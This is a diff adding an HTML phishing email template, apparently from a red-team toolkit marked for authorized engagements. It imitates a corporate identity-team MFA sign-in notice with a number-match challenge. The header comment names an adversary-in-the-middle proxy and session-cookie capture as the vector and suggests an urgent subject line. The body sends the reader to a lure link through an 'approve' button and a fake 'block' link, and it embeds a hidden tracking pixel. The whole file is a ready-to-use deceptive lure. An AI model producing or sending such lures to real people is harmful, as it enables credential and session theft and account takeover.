@@ -1,0 +1,85 @@
+<!-- SecEmail template — authorized engagements only.
+     Pretext: MFA push approval with number-match challenge.
+     Vector: AiTM proxy + session cookie capture.
+     Subject suggestion: "Action required: approve sign-in to your account".
+     Runtime placeholders: {{COMPANY_NAME}}, {{TARGET_EMAIL}}, {{LURE_URL}},
+       {{PIXEL_URL}}, {{MATCH_NUMBER}}, {{DEVICE_NAME}},
+       {{DEVICE_LOCATION}}, {{REQUEST_TIME}}, {{SUPPORT_URL}}. -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="x-apple-disable-message-reformatting">
+<title>Approve sign-in to your account</title>
+</head>
+<body style="margin:0;padding:0;background:#f3f2f1;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;color:#1b1b1b;-webkit-font-smoothing:antialiased;line-height:1.5;">
+<table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="background:#f3f2f1;padding:40px 16px;">
+  <tr><td align="center">
+    <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="max-width:520px;background:#ffffff;border-radius:10px;overflow:hidden;box-shadow:0 1px 3px rgba(0,0,0,0.06);">
+
+      <!-- Header with corporate accent -->
+      <tr><td style="background:#0078d4;padding:16px 28px;">
+        <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%">
+          <tr>
+            <td style="vertical-align:middle;">
+              <span style="display:inline-block;width:24px;height:24px;background:#ffffff;border-radius:5px;text-align:center;line-height:24px;color:#0078d4;font-weight:800;font-size:13px;vertical-align:middle;">●</span>
+              <span style="color:#ffffff;font-size:13px;font-weight:600;margin-left:10px;letter-spacing:0.2px;vertical-align:middle;">{{COMPANY_NAME}} · Identity</span>
+            </td>
+            <td align="right" style="color:rgba(255,255,255,0.75);font-size:11px;vertical-align:middle;letter-spacing:0.4px;">{{REQUEST_TIME}}</td>
+          </tr>
+        </table>
+      </td></tr>
+
+      <!-- Body -->
+      <tr><td style="padding:32px 32px 8px 32px;">
+        <h1 style="margin:0 0 8px 0;font-size:21px;line-height:1.3;font-weight:600;color:#1b1b1b;letter-spacing:-0.2px;">Is this you trying to sign in?</h1>
+        <p style="margin:0 0 24px 0;font-size:14px;color:#605e5c;">Hi, we detected a sign-in to <strong style="color:#323130;">{{TARGET_EMAIL}}</strong>. If it was you, enter this number in the app:</p>
+      </td></tr>
+
+      <!-- Match number -->
+      <tr><td align="center" style="padding:0 32px 28px 32px;">
+        <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%">
+          <tr><td style="background:#eaf3fb;border:1px solid #c7dbef;border-radius:14px;padding:34px 24px;text-align:center;">
+            <div style="font-size:60px;line-height:1;font-weight:200;color:#0078d4;letter-spacing:8px;font-family:-apple-system,'Segoe UI',Helvetica,sans-serif;">{{MATCH_NUMBER}}</div>
+            <div style="font-size:11px;color:#0b5394;text-transform:uppercase;letter-spacing:2.5px;font-weight:600;margin-top:14px;">Enter this number in your app</div>
+          </td></tr>
+        </table>
+      </td></tr>
+
+      <!-- Attempt info -->
+      <tr><td style="padding:0 32px 24px 32px;">
+        <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="background:#faf9f8;border-radius:8px;">
+          <tr>
+            <td style="padding:14px 18px;border-right:1px solid #edebe9;width:50%;vertical-align:top;">
+              <div style="font-size:11px;color:#a19f9d;text-transform:uppercase;letter-spacing:0.8px;margin-bottom:4px;font-weight:600;">Device</div>
+              <div style="font-size:13px;color:#323130;font-weight:500;">{{DEVICE_NAME}}</div>
+            </td>
+            <td style="padding:14px 18px;width:50%;vertical-align:top;">
+              <div style="font-size:11px;color:#a19f9d;text-transform:uppercase;letter-spacing:0.8px;margin-bottom:4px;font-weight:600;">Approx. location</div>
+              <div style="font-size:13px;color:#323130;font-weight:500;">{{DEVICE_LOCATION}}</div>
+            </td>
+          </tr>
+        </table>
+      </td></tr>
+
+      <!-- CTA -->
+      <tr><td align="center" style="padding:8px 32px 32px 32px;">
+        <a href="{{LURE_URL}}" style="display:inline-block;padding:13px 36px;background:#0078d4;color:#ffffff;text-decoration:none;border-radius:6px;font-size:14px;font-weight:600;letter-spacing:0.2px;">Open the app and approve</a>
+        <div style="margin-top:14px;font-size:12px;color:#605e5c;">Wasn't you? <a href="{{SUPPORT_URL}}" style="color:#0078d4;text-decoration:underline;">Block this attempt</a></div>
+      </td></tr>
+
+      <!-- Footer -->
+      <tr><td style="padding:18px 32px;background:#faf9f8;border-top:1px solid #edebe9;font-size:11px;line-height:1.55;color:#a19f9d;">
+        <strong style="color:#605e5c;">Never share the matching number</strong> with anyone by phone, message, or social media. {{COMPANY_NAME}} will never ask you for this code directly.
+      </td></tr>
+    </table>
+    <div style="font-size:11px;color:#979593;margin-top:18px;line-height:1.55;text-align:center;max-width:520px;">
+      You're receiving this notice because of recent activity on your {{TARGET_EMAIL}} account.<br>
+      {{COMPANY_NAME}} · Identity team
+    </div>
+  </td></tr>
+</table>
+<img src="{{PIXEL_URL}}" width="1" height="1" alt="" style="display:block;border:0;outline:none;opacity:0;">
+</body>
+</html>
